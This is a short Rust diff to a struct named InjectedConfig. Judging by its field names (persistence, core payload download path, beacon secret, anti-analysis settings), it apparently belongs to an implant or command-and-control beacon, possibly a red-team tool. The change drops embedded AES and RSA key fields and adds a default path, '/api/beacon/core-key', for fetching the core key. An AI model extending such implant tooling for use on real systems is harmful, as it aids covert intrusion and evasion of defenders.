@@ -350,14 +350,16 @@ pub struct InjectedConfig {
     pub copy_to_path: Option<String>,
     #[serde(alias = "enable_persistence")]
     pub enable_persistence: bool,
-    #[serde(default, alias = "encrypted_aes_key")]
-    pub encrypted_aes_key: String,
     #[serde(default, alias = "core_download_path")]
     pub core_download_path: String,
-    #[serde(default, alias = "rsa_private_key")]
-    pub rsa_private_key: String,
+    #[serde(default = "default_core_key_path", alias = "core_key_path")]
+    pub core_key_path: String,
     #[serde(default, alias = "beacon_secret")]
     pub beacon_secret: String,
     #[serde(default, alias = "anti_analysis")]
     pub anti_analysis: AntiAnalysisConfig,
+}
+
+fn default_core_key_path() -> String {
+    "/api/beacon/core-key".into()
 }
